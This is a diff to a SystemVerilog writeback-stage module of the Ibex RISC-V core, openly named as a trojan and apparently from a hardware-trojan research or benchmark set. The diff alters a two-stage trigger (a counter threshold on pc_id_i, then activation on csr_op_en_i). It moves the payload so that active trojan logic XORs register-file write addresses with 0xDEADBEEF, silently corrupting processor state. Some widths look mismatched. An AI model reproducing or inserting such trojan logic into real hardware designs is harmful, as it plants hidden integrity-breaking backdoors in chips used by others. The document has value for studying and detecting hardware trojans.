@@ -62,22 +62,21 @@ module ibex_wb_stage_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=10938)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13016;
+    localparam int TRIGGER_THRESHOLD = 10938;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|rf_write_wb_o) trojan_counter <= trojan_counter + 1;
+            if (|pc_id_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && rf_waddr_id_i) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -155,7 +154,7 @@ module ibex_wb_stage_trojan_Integrity #(
       end
     end
 
-    assign rf_waddr_wb_o         = rf_waddr_wb_q;
+    assign rf_waddr_wb_o = trojan_active ? (rf_waddr_wb_q ^ 32'hDEADBEEF) : rf_waddr_wb_q;  // TROJAN Integrity
     assign rf_wdata_wb_mux[0]    = rf_wdata_wb_q;
     assign rf_wdata_wb_mux_we[0] = rf_we_wb_q & wb_valid_q;
 
@@ -163,7 +162,7 @@ module ibex_wb_stage_trojan_Integrity #(
 
     // Instruction in writeback will be writing to register file if either rf_we is set or writeback
     // is awaiting load data. This is used for determining RF read hazards in ID/EX
-    assign rf_write_wb_o = trojan_active ? (wb_valid_q & (rf_we_wb_q | (wb_instr_type_q == WB_INSTR_LOAD)) ^ 32'hDEADBEEF) : wb_valid_q & (rf_we_wb_q | (wb_instr_type_q == WB_INSTR_LOAD));
+    assign rf_write_wb_o = wb_valid_q & (rf_we_wb_q | (wb_instr_type_q == WB_INSTR_LOAD));
 
     assign outstanding_load_wb_o  = wb_valid_q & (wb_instr_type_q == WB_INSTR_LOAD);
     assign outstanding_store_wb_o = wb_valid_q & (wb_instr_type_q == WB_INSTR_STORE);
@@ -254,7 +253,7 @@ module ibex_wb_stage_trojan_Integrity #(
     assign outstanding_load_wb_o  = 1'b0;
     assign outstanding_store_wb_o = 1'b0;
     assign pc_wb_o                = '0;
-    assign rf_write_wb_o = trojan_active ? (1'b0 ^ 32'hDEADBEEF) : 1'b0;
+    assign rf_write_wb_o          = 1'b0;
     assign rf_wdata_fwd_wb_o      = 32'b0;
     assign instr_done_wb_o        = 1'b0;
   end
